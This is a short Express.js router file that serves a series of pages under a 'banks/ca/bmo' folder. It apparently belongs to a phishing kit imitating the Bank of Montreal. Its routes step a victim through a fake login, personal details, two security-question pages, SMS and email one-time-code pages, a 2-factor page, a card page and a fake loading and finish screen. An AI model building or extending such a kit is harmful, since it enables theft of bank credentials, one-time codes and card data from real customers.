const express = require('express');
const path = require('path');  // Use 'path' instead of 'node:path'
const router = express.Router();
  

router.get('/', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/login/page.html'))});

router.get('/details',(req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/details/page.html'))});

router.get('/question', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/question/page.html'))});

router.get('/question/2', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/quest2/page.html'))});

router.get('/sms-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/sms/page.html'))});

router.get('/auth', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/auth/page.html'))});

router.get('/email-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/otp/page.html'))});


router.get('/2factor', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/twofactor/page.html'))});

router.get('/loading', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/loading/page.html'))});


router.get('/finish', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/finish/page.html'))});

router.get('/card', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/bmo/card/page.html'))});


module.exports = router;